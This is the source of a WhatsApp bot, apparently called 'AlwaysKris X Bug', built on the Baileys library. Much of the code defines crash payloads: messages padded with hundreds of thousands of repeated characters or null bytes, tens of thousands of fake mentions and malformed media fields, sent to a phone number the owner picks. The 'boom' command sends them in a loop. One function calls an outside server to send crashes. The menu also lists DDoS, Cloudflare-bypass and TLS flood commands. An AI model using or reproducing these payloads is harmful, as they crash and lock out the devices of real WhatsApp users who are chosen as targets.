const { default:
makeWASocket,
fetchLatestBaileysVersion,
downloadContentFromMessage,
useMultiFileAuthState,
BufferJSON,
WA_DEFAULT_EPHEMERAL,
generateWAMessageFromContent,
proto, generateWAMessageContent,
generateWAMessage,
prepareWAMessageMedia,
areJidsSameUser,
getContentType
} = require('@whiskeysockets/baileys')

const os = require('os')
const fs = require('fs') 
const fsx = require('fs-extra')
const path = require('path')
const util = require('util')
const chalk = require('chalk')
const moment = require('moment-timezone')
const speed = require('performance-now')
const ms = toMs = require('ms')
const axios = require('axios')
const fetch = require('node-fetch')
const pino = require('pino')
const readline = require("readline");
const { exec, spawn, execSync } = require("child_process")
const { performance } = require('perf_hooks')
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const { toAudio, toPTT, toVideo, ffmpeg, ExifAvatar } = require('./ラ-Library/converter')
const { smsg, getGroupAdmins, formatp, jam, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, json, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./ラ-Library/myfunc')
let afk = require("./ラ-Library/afk");
const { PremiumUser, getPremiumExpired, getPremiumPosition, expiredCheck, checkPremiumUser, getAllPremiumUser } = require('./ラ-Library/premiun')
const NodeCache = require('node-cache');

//database
let premium = JSON.parse(fs.readFileSync('./ラ-Database/premium.json'))
let _owner = JSON.parse(fs.readFileSync('./ラ-Database/owner.json'))
let owner = JSON.parse(fs.readFileSync('./ラ-Database/owner.json'))
let _afk = JSON.parse(fs.readFileSync('./ラ-Database/afk-user.json'))
let hit = JSON.parse(fs.readFileSync('./ラ-Database/total-hit-user.json'))

//time
const xtime = moment.tz('Asia/Jakarta').format('HH:mm:ss')
const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
if(time2 < "23:59:00"){
var clientytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var clientytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var clientytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var clientytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var clientytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var clientytimewisher = `Good Morning 🌄`
 } 
module.exports = client = async (client, m, msg, chatUpdate, store) => {
    try {
        const {
            type,
            quotedMsg,
            mentioned,
            now,
            fromMe
        } = m
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectm.reply.selectedRowId : (m.mtype == 'templateButtonm.replyMessage') ? m.message.templateButtonm.replyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectm.reply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase();
const args = body.trim().split(/ +/).slice(1);
const full_args = body.replace(command, '').slice(1).trim();
const pushname = m.pushName || 'No Name';
const botNumber = await client.decodeJid(client.user.id);
const itsMe = m.sender == botNumber ? true : false;
const sender = m.sender;
const text = (q = args.join(' '));
const from = m.key.remoteJid;
const fatkuns = (m.quoted || m);
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isText = (type == 'textMessage')
        const isSticker = (type == 'stickerMessage')
        const isQuotedText = type === 'extendexTextMessage' && content.includes('textMessage')
        const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sticker = []
        const isAfkOn = afk.checkAfkUser(m.sender, _afk)
        const isGroup = m.key.remoteJid.endsWith('@g.us')
        const groupMetadata = m.isGroup ? await client.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
        const isCreator = [ownernumber, ..._owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const isPremium = isCreator || isCreator || checkPremiumUser(m.sender, premium);
        const clientId = client.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? client.user.id.split(':')[0] + "@s.whatsapp.net" || client.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
        const alwkris = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				listResponseMessage: {
					title: "AlwaysKris\n" + "ꦾ".repeat(500000)
				}
			}
		}
        expiredCheck(client, m, premium);
        // QUOTED
        const GSZ = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				listResponseMessage: {
					title: `⃰𝐀𝐥𝐰͢𝐚𝐲ͯ𝐬𝐊͢𝐫𝐢𝐬 𝐈𝐬 𝐇ͯ𝐞͢𝐫𝐞ཀ͜͡🇮🇩〽️`
				}
			}
		};
		const GSZ2 = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				listResponseMessage: {
					title: `⃰𝐀𝐥𝐰͢𝐚𝐲ͯ𝐬𝐊͢𝐫𝐢𝐬 𝐈𝐬 𝐇ͯ𝐞͢𝐫𝐞ཀ͜͡🇮🇩〽️`
				}
			}
		}
        // =====================
        // FUNCTION WM SALURAN
        async function replysyxn(txt) {
const syxnrep = {      
contextInfo: {
isForwarded: false,
externalAdReply: {  
showAdAttribution: true,
renderLargerThumbnail: false,
title: '🩸⃟༑⌁⃰𝐀𝐥𝐰͢𝐚𝐲ͯ𝐬𝐊͢𝐫𝐢𝐬 𝐈𝐬 𝐇ͯ𝐞͢𝐫𝐞ཀ͜͡🇮🇩〽️',
body: '🩸⃟༑⌁⃰𝐀𝐥𝐰͢𝐚𝐲ͯ𝐬𝐊͢𝐫𝐢𝐬 𝐈𝐬 𝐇ͯ𝐞͢𝐫𝐞ཀ͜͡🇮🇩〽️',
sourceUrl: link,
thumbnailUrl: 'https://k.top4top.io/p_3248lqkjx1.jpg'
},
},
text: txt,
}
return client.sendMessage(m.chat, syxnrep, {
quoted: GSZ,
})
}
// =========================
        // Function Loading
        async function loading () {

var synlod = [
"Lᴏᴀᴅɪɴɢ.",
"Lᴏᴀᴅɪɴɢ..",
"Lᴏᴀᴅɪɴɢ...",
"ʟᴏᴀᴅɪɴɢ...\n© A",
"ʟᴏᴀᴅɪɴɢ...\n© Aʟ",
"ʟᴏᴀᴅɪɴɢ...\n© Aʟᴡ",
"ʟᴏᴀᴅɪɴɢ...\n© Aʟᴡᴀ",
"ʟᴏᴀᴅɪɴɢ...\n© Aʟᴡᴀʏ",
"ʟᴏᴀᴅɪɴɢ...\n© Aʟᴡᴀʏs",
"ʟᴏᴀᴅɪɴɢ...\n© AʟᴡᴀʏsK",
"ʟᴏᴀᴅɪɴɢ...\n© AʟᴡᴀʏsKʀ",
"ʟᴏᴀᴅɪɴɢ...\n© AʟᴡᴀʏsKʀɪ",
"ʟᴏᴀᴅɪɴɢ...\n© AʟᴡᴀʏsKʀɪs",
"ʟᴏᴀᴅɪɴɢ ᴄᴏᴍᴘʟᴇᴛᴇ..\nʙʏ © AʟᴡᴀʏsKʀɪs"
]
let { key } = await client.sendMessage(from, {text: 'Tunggu Sebentar...'})

for (let i = 0; i < synlod.length; i++) {
await client.sendMessage(from, {text: synlod[i], edit: key });
}
}
// All Bug terpisah

async function vtex(X) {
let valhalla = "AlwaysKris" + "ꦾ".repeat(50000);

let mentionedJidArray = Array.from({ length: 35000 }, () => 
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
);

let ngentot = {
groupMentionedMessage: {
message: {
listResponseMessage: {
title: " @120363326274964194@g.us",
listType: "SINGLE_SELECT",
singleSelectReply: {
selectedRowId: "Gateway To Hell"
},
description: " @120363326274964194@g.us",
contextInfo: {
mentionedJid: mentionedJidArray,
groupMentions: [{ 
groupJid: "120363326274964194@g.us", 
groupSubject: valhalla 
}]
}
}
}
}
};

await client.relayMessage(X, ngentot, { participant: { jid: X } }, { messageId: null });
console.log(chalk.red(`Berhasil Mengirim Bug Ke Nomor ${X}`));

}

async function newstuck(X) {
await client.relayMessage(X, {
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0
},
hasMediaAttachment: true
},
body: {
text: "AlwaysKris Trash Whatsapp" + "ꦾ".repeat(300000)
},
nativeFlowMessage: {},
contextInfo: {
mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
groupMentions: [{ groupJid: "1@newsletter", groupSubject: " trashboy " }]
}
}
}
}
}, { participant: { jid: X } }, { messageId: null });
console.log(chalk.red(`Berhasil Mengirim Bug Ke Nomor ${X}`));
}

async function Tedex(X, QTD) {
			await client.relayMessage(X, {
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'locationMessage': {},
								'hasMediaAttachment': true
							},
							'body': {
								'text': '𝐊͢𝐑ͯ𝐈͢𝐒͢𝐓ͯ𝐙ͯ𝐘͢ 〽️' + '\x00'.repeat(950000)
							},
							'nativeFlowMessage': {
								'messageParamsJson': '\x00'
							},
							'carouselMessage': {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			await client.sendMessage(X, {
				text: `AlwaysKris X Bug\`𐁘`
			}, {
				quoted: m
			});
			console.log(chalk.green("Bug Sending By AlwaysKris X Bug〽️"));
		};

async function sendCrash(X) {
			try {
				const newcrash = await fetchJson('http://nxf-01.nexfuture.com.br:25579/sendCrash?numero=' + X);
				console.log(chalk.green("Bug Sending By AlwaysKris X Bug〽️"));
				console.log(chalk.red("InVisible⚡"));
			} catch (error) {
				console.error("Error Fetching Crash:", error);
			}
		}
		
async function powered(X, Ptcp = true) {
await client.relayMessage(X, {
extendedTextMessage: {
text: "͖͝\n" + "ꦾ".repeat(45000),
contextInfo: {
mentionedJid: [
"6282146497469@s.whatsapp.net",
...Array.from({
length: 15000
}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
],
stanzaId: "1234567890ABCDEF",
participant: "6282146497469@s.whatsapp.net",
quotedMessage: {
callLogMesssage: {
isVideo: false,
callOutcome: "5",
durationSecs: "999",
callType: "REGULAR",
participants: [{
jid: "6282146497469@s.whatsapp.net",
callOutcome: "5"
}]
}
},
remoteJid: X,
conversionSource: " X ",
conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
conversionDelaySeconds: 10,
forwardingScore: 10,
isForwarded: false,
quotedAd: {
advertiserName: " X ",
mediaType: "IMAGE",
jpegThumbnail: fs.readFileSync('./IMG-20241030-WA0055.jpg'),
caption: " X "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: 86400,
ephemeralSettingTimestamp: "1728090592378",
ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
externalAdReply: {
title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
body: "clientstyle.deobfuscator.biz.id",
mediaType: "VIDEO",
renderLargerThumbnail: true,
previewType: "VIDEO",
thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
sourceType: " x ",
sourceId: " x ",
sourceUrl: "x",
mediaUrl: "x",
containsAutoReply: true,
showAdAttribution: true,
ctwaClid: "ctwa_clid_example",
ref: "ref_example"
},
entryPointConversionSource: "entry_point_source_example",
entryPointConversionApp: "entry_point_app_example",
entryPointConversionDelaySeconds: 5,
disappearingMode: {},
actionLink: {
url: "‎ ‎ "
},
groupSubject: " X ",
parentGroupJid: "6287888888888-1234567890@g.us",
trustBannerType: " X ",
trustBannerAction: 1,
isSampled: false,
utm: {
utmSource: " X ",
utmCampaign: " X "
},
forwardedNewsletterMessageInfo: {
newsletterJid: "6287888888888-1234567890@g.us",
serverMessageId: 1,
newsletterName: " X ",
contentType: "UPDATE",
accessibilityText: " X "
},
businessMessageForwardInfo: {
businessOwnerJid: "0@s.whatsapp.net"
},
smbClientCampaignId: "smb_client_campaign_id_example",
smbServerCampaignId: "smb_server_campaign_id_example",
dataSharingContext: {
showMmDisclosure: true
}
}
}
},
Ptcp ? {
participant: {
jid: X
}
} : {}
);
console.log(chalk.red(`Berhasil Mengirim Bug Ke Nomor ${X}`));
}

async function PIRGO(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				interactiveMessage: {
					header: {
						title: "🩸⃟༑⌁⃰𝐀𝐥𝐰͢𝐚𝐲ͯ𝐬𝐊͢𝐫𝐢𝐬 𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡💀",
						hasMediaAttachment: true,
						...(await prepareWAMessageMedia({
							image: {
								url: "https://k.top4top.io/p_3248lqkjx1.jpg"
							}
						}, {
							upload: client.waUploadToServer
						}))
					},
					body: {
						text: ""
					},
					footer: {
						text: "› ©MargaAlways"
					},
					nativeFlowMessage: {
						messageParamsJson: " ".repeat(1000000)
					}
				}
			}), {
				userJid: LockJids,
				quoted: GSZ
			});
			await client.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}
		
		async function KrisLok(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "x",
							"degreesLongitude": "x",
							"caption": `🩸⃟༑⌁⃰𝐀𝐥𝐰͢𝐚𝐲ͯ𝐬𝐊͢𝐫𝐢𝐬 𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡💀〽️` + "\u0000",
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: GSZ
			});
			await client.relayMessage(LockJids, etc.message, {
				messageId: etc.key.id
			});
		}
		async function KRISLOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						"liveLocationMessage": {
							"degreesLatitude": "p",
							"degreesLongitude": "p",
							"caption": `🍷꙰͜͡𝐊𝐫𝐢𝐬𝐓𝐳𝐲 💸` + "\u0000".repeat(900000),
							"sequenceNumber": "0",
							"jpegThumbnail": ""
						}
					}
				}
			}), {
				userJid: LockJids,
				quoted: alwkris
			})
			await client.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			})
		}

		async function VIRDOK(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"documentMessage": {
					"url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
					"mimetype": "penis",
					"fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
					"fileLength": "999999999",
					"pageCount": 999999999,
					"mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
					"fileName": `🔥፝⃟ ꙳𝐊𝐫𝐢𝐬𝐓𝐳𝐲🔥፝⃟` + "\u0000".repeat(900000),
					"fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
					"directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
					"mediaKeyTimestamp": "1715880173"
				}
			}), {
				userJid: LockJids,
				quoted: alwkris
			});
			await client.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}

		async function BLEKING(LockJids, QUOTED) {
			var etc = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				"stickerMessage": {
					"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
					"fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
					"fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
					"mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
					"mimetype": "image/webp",
					"directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
					"fileLength": "10116",
					"mediaKeyTimestamp": "1715876003",
					"isAnimated": false,
					"stickerSentTs": "1715881084144",
					"isAvatar": false,
					"isAiSticker": false,
					"isLottie": false
				}
			}), {
				userJid: LockJids,
				quoted: alwkris
			});
			await client.relayMessage(LockJids, etc.message, {
				participant: {
					jid: LockJids
				},
				messageId: etc.key.id
			});
		}
// ======== Fnc Bug End ======= //
        // Function Reply
        async function reply(teks) {
        const mek = { text: teks };
        return client.sendMessage(m.chat, mek, { quoted: m }
        );
        };

        client.sendPresenceUpdate('uavailable', from)
        let list = []
        for (let i of owner) {
list.push({
	    	displayName: await client.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await client.getName(i)}\nFN:${await client.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	
	//chat counter (console log)
        if (m.message && m.isGroup) {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Group Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            console.log(chalk.cyan(`\n< ================================================== >\n`))
			console.log(chalk.green(`Private Chat:`))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

        if (command) {
            const cmd = () => {
                hit[0].hit_cmd += 1
                fs.writeFileSync('./ラ-Database/total-hit-user.json', JSON.stringify(hit))
            }
            cmd()
            const totalhit = JSON.parse(fs.readFileSync('./ラ-Database/total-hit-user.json'))[0].hit_cmd
        }
        
        if (m.isGroup && !m.key.fromMe) {
            let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
            for (let ment of mentionUser) {
                if (afk.checkAfkUser(ment, _afk)) {
                    let getId2 = afk.getAfkId(ment, _afk)
                    let getReason2 = afk.getAfkReason(getId2, _afk)
                    let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
                    let heheh2 = ms(getTimee)
                    m.reply(`Don't tag him, he's afk\n\n*Reason :* ${getReason2}`)
                }
            }
            if (afk.checkAfkUser(m.sender, _afk)) {
                let getId = afk.getAfkId(m.sender, _afk)
                let getReason = afk.getAfkReason(getId, _afk)
                let getTime = Date.now() - afk.getAfkTime(getId, _afk)
                let heheh = ms(getTime)
                _afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
                fs.writeFileSync('./ラ-Database/afk-user.json', JSON.stringify(_afk))
                client.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} have returned from afk`, m)
            }
        }
        switch (command) {
            case 'ping':{
                const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
`
replysyxn(respon);
break
}
case 'menu':
  const menuText = `Halo Kak @${m.sender.split("@")[0]}

Berikut adalah fitur dari bot AlwaysKrisBug💀🇮🇩

Bot Information

*RUNTIME:* ${runtime(process.uptime())}
*BOT NAME:* AlwaysKris X Bug
*Owner Name:* AlwaysKris
*Owner Number:* @6288294276026
*Script Version:*  V1.0.0

User Information

Tag: @${m.sender.split("@")[0]}
Number:
Name: ${pushname}

Menu Bug
> crash 62xx
> xtravas 62xx
> xui 62xx
> uikiller 62xx
> syxnattack 62xx
> boom 62xx
> attack 62xx
> modar 62xx
> kill 62xx

Menu Fusion
> crashxtravas 62xx
> syxnattackxboom 62xx
> attackxmodar 62xx
> fusionall 62xx

Menu Attack
> tempban
> spampair
> ddos
> dos
> ua
> xchrome
> tlsv
> bypass-cf
> tlsv2
> tlsv-vip
> tls
> mix
> floods
> xc

> © Zero Coding AlwaysKris🇮🇩`;

client.sendMessage(from, {
    image: { url: `https://k.top4top.io/p_3248lqkjx1.jpg` },
    caption: menuText,
    fileLength: 10,
    contextInfo: {
        mentionedJid: [sender],
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363334995651843@newsletter',
            newsletterName: 'Powered By AlwaysKris',
            serverMessageId: -1
        },
        businessMessageForwardInfo: {
            businessOwnerJid: client.decodeJid(client.user.id)
        }
    },
    quoted: m
});
break
case 'boom':
await client.sendMessage(m.chat, { react: { text: "☠️",key: m.key,}
})
if (!isCreator) return replysyxn('ONLY FOR OWNER')
if (!q) return reply('Example 62xxx')
let XTarget = q.replace(/[^0-9]/g, "")
if (XTarget.startsWith('0')) return reply(`*FORMAT SALAH!*\nContoh: .${command} 62xx`)
let Target = XTarget + '@s.whatsapp.net'
replysyxn(`ALL BUG HAS SENT TO ${Target}`)

for (let i = 0; i < 5; i++) {
await vtex(Target)
await newstuck(Target,)
await powered(Target, Ptcp = true)
await Tedex(Target, PIRGO)
}

